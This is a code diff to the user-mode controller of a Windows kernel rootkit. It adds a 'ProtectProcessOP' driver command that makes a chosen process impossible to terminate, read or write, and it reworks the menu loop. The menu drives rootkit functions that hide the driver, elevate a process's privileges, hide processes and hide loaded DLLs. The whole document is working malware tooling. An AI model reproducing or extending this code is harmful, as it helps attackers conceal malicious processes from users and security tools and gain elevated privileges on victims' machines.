@@ -16,6 +16,8 @@ namespace Rootkit {
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
         constexpr ULONG UnProtectProcess =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG ProtectProcessOP =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
     struct Request {
         HANDLE process_id;
@@ -37,6 +39,21 @@ namespace Rootkit {
             nullptr                      // Overlapped
         );
 
+    }
+
+    bool ProtectProcessOP(HANDLE driver_handle, DWORD pid) {
+        Request r;
+        r.process_id = UlongToHandle(pid);
+        return DeviceIoControl(
+            driver_handle,
+            codes::ProtectProcessOP,
+            &r,
+            sizeof(r),
+            &r,
+            sizeof(r),
+            nullptr,
+            nullptr
+        );
     }
 
     bool UnProtectProcess(HANDLE driver_handle, DWORD pid) {
@@ -175,6 +192,7 @@ int main() {
     int pidProtect;
     int pidDLLHide;
     int choiceProtect;
+    bool enabled = true;
     WCHAR DLLName[256];
     std::wstring tempDLLName;
 
@@ -186,6 +204,8 @@ int main() {
         case 1: {
             std::cout << "[!] Sending Message to Driver.\n";
             Rootkit::HideTheDriver(driver_handle);
+            Sleep(2000);
+            system("cls");
             break;
         }
         case 2: {
@@ -193,6 +213,8 @@ int main() {
             std::cin >> pid;
             std::cout << "[!] Sending Message to Driver.\n";
             Rootkit::ElevateProcess(driver_handle, pid);
+            Sleep(2000);
+            system("cls");
             break;
         }
         case 3: {
@@ -200,33 +222,55 @@ int main() {
             std::cin >> pidHide;
             std::cout << "[!] Sending Message to Driver.\n";
             Rootkit::HideProcess(driver_handle, pidHide);
+            Sleep(2000);
+            system("cls");
             break;
         }
         case 4: {
-            system("cls");
-            std::cout << "===== Process Protection Menu =====\n";
-            std::cout << "1. Protect a Process.\n";
-            std::cout << "2. UnProtect a Process.\n";
-            std::cout << "=======================\n";
-            std::cout << "Enter a choice: ";
-            std::cin >> choiceProtect;
-            switch (choiceProtect) {
-            case 1:
-                std::cout << "Enter a PID: ";
-                std::cin >> pidProtect;
-                std::cout << "[!] Sending Message to Driver.\n";
-                Rootkit::ProtectProcess(driver_handle, pidProtect);
+            while (enabled) {
+                system("cls");
+                std::cout << "===== Process Protection Menu =====\n";
+                std::cout << "1. Protect a Process.\n";
+                std::cout << "2. UnProtect a Process.\n";
+                std::cout << "3. Protect a Process without causing a BSOD. (For Explanation Input 99.)\n";
+                std::cout << "=======================\n";
+                std::cout << "Enter a choice: ";
+                std::cin >> choiceProtect;
+                switch (choiceProtect) {
+                case 1:
+                    std::cout << "Enter a PID: ";
+                    std::cin >> pidProtect;
+                    std::cout << "[!] Sending Message to Driver.\n";
+                    Rootkit::ProtectProcess(driver_handle, pidProtect);
+                    enabled = false;
+                    break;
+                case 2:
+                    std::cout << "Enter a PID: ";
+                    std::cin >> pidProtect;
+                    std::cout << "[!] Sending Message to Driver.\n";
+                    Rootkit::UnProtectProcess(driver_handle, pidProtect);
+                    enabled = false;
+                    break;
+                case 3:
+                    std::cout << "Enter a PID: ";
+                    std::cin >> pidProtect;
+                    std::cout << "[!] Sending Message to Driver.\n";
+                    Rootkit::ProtectProcessOP(driver_handle, pidProtect);
+                    enabled = false;
+                    break;
+                case 99:
+                    system("cls");
+                    std::cout << "Protecting a process this way will cause an access denied on termination, and also will protect from viewing the memory of the process or writing to it.\n\n";
+                    std::cout << "Returning to Main Menu in 10 seconds...\n";
+                    Sleep(10000);
+                    system("cls");
+                    break;
+                default:
+                    std::cout << "Invalid Choice. Exiting Program...\n";
+                    CloseHandle(driver_handle);
+                    return 1;
+                }
                 break;
-            case 2:
-                std::cout << "Enter a PID: ";
-                std::cin >> pidProtect;
-                std::cout << "[!] Sending Message to Driver.\n";
-                Rootkit::UnProtectProcess(driver_handle, pidProtect);
-                break;
-            default:
-                std::cout << "Invalid Choice. Exiting Program...\n";
-                CloseHandle(driver_handle);
-                return 1;
             }
             break;
         }
@@ -243,6 +287,8 @@ int main() {
             wcsncpy_s(DLLName, tempDLLName.c_str(), _TRUNCATE);
             std::wcout << L"[!] Sending Message to Driver.\n";
             Rootkit::HideDLL(driver_handle, pidDLLHide, DLLName);
+            Sleep(2000);
+            system("cls");
             break;
         }
         case 99: {
